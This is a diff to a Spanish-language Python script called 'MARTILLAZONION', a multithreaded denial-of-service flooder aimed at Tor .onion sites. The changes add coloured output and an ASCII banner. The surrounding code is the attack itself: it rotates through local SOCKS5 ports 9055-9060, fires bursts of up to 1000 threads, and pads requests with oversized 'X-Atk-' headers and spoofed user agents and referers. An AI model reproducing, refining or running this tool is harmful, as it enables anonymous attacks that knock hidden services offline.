@@ -1,12 +1,28 @@
+ 
 import socks
 import socket
 import threading
 import random
 import time
-
-onion_host = input("Dominio .onion (v3): ").strip()
+ 
+# Colores ANSI
+RED = "\033[91m"
+GREEN = "\033[92m"
+RESET = "\033[0m"
+ 
+# Banner en ASCII (verde)
+print(GREEN + r"""
+                       __  .__.__  .__                             .__               
+  _____ _____ ________/  |_|__|  | |  | _____  ____________   ____ |__| ____   ____  
+ /     \\__  \\_  __ \   __\  |  | |  | \__  \ \___   /  _ \ /    \|  |/  _ \ /    \ 
+|  Y Y  \/ __ \|  | \/|  | |  |  |_|  |__/ __ \_/    (  <_> )   |  \  (  <_> )   |  \ 
+|__|_|  (____  /__|   |__| |__|____/____(____  /_____ \____/|___|  /__|\____/|___|  /
+      \/     \/                              \/      \/          \/               \/ 
+""" + RESET)
+ 
+onion_host = input(GREEN + "Dominio .onion (v3): " + RESET).strip()
 proxy_ports = list(range(9055, 9061))  # Puertos 9055 al 9060
-
+ 
 PORT = 80
 MAX_HILOS = 1000
 RAFA_MAX = 250
@@ -15,7 +31,7 @@ TTL_VALUE = 1
 SOCKET_TIMEOUT = 4
 DELAY_ENTRE_PAKETS = 0.002
 DELAY_RAFAGA = 15
-
+ 
 user_agents = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
     "Mozilla/5.0 (X11; Linux x86_64)",
@@ -23,18 +39,18 @@ user_agents = [
     "Wget/1.21.1",
     "Lynx/2.8.9rel.1"
 ]
-
+ 
 referers = [
     "http://duckduckgo.com",
     "http://protonmail.com",
     "http://torproject.org",
     "http://facebookcorewwwi.onion"
 ]
-
+ 
 lock = threading.Lock()
 proxy_index = 0
 hilos_activos = 0
-
+ 
 def generar_payload():
     headers_extra = ''.join(
         f"X-Atk-{i}: {'Z' * random.randint(400, 950)}\r\n"
@@ -48,14 +64,14 @@ def generar_payload():
         f"{headers_extra}"
         f"Connection: close\r\n\r\n"
     )
-
+ 
 def get_next_proxy():
     global proxy_index
     with lock:
         port = proxy_ports[proxy_index]
         proxy_index = (proxy_index + 1) % len(proxy_ports)
         return port
-
+ 
 def proxy_disponible(port):
     try:
         test = socket.create_connection(("127.0.0.1", port), timeout=3)
@@ -63,7 +79,7 @@ def proxy_disponible(port):
         return True
     except:
         return False
-
+ 
 def ataque():
     global hilos_activos
     port = get_next_proxy()
@@ -85,7 +101,7 @@ def ataque():
     finally:
         with lock:
             hilos_activos -= 1
-
+ 
 def lanzar_rafaga(cantidad):
     global hilos_activos
     with lock:
@@ -94,12 +110,12 @@ def lanzar_rafaga(cantidad):
             return
         lanzar = cantidad if cantidad <= permitidos else permitidos
         hilos_activos += lanzar
-
+ 
     for _ in range(lanzar):
         t = threading.Thread(target=ataque)
         t.daemon = True
         t.start()
-
+ 
 def monitorear_proxies():
     while True:
         down = []
@@ -107,19 +123,19 @@ def monitorear_proxies():
             if not proxy_disponible(port):
                 down.append(port)
         if down:
-            print(f"[✗] SOCKS inactivos: {down}")
+            print(RED + f"[✗] SOCKS inactivos: {down}" + RESET)
         time.sleep(10)
-
+ 
 def main_loop():
     threading.Thread(target=monitorear_proxies, daemon=True).start()
     while True:
         lanzar_rafaga(RAFA_MAX)
         with lock:
-            print(f"[⚒️] Ráfaga: {RAFA_MAX} hilos activos: {hilos_activos}")
+            print(RED + f"[⚒️] Ráfaga: {RAFA_MAX} hilos activos: {hilos_activos}" + RESET)
         time.sleep(DELAY_RAFAGA)
-
+ 
 if __name__ == "__main__":
-    print(f"\n[🔥] MARTILLAZONION Multipuerto 9055–9060")
+    print(GREEN + f"\n[🔥] MARTILLAZONION Multipuerto 9055–9060")
     print(f"[→] Objetivo: {onion_host}")
-    print(f"[→] Usando SOCKS5 puertos: {proxy_ports}\n")
+    print(f"[→] Usando SOCKS5 puertos: {proxy_ports}\n" + RESET)
     main_loop()
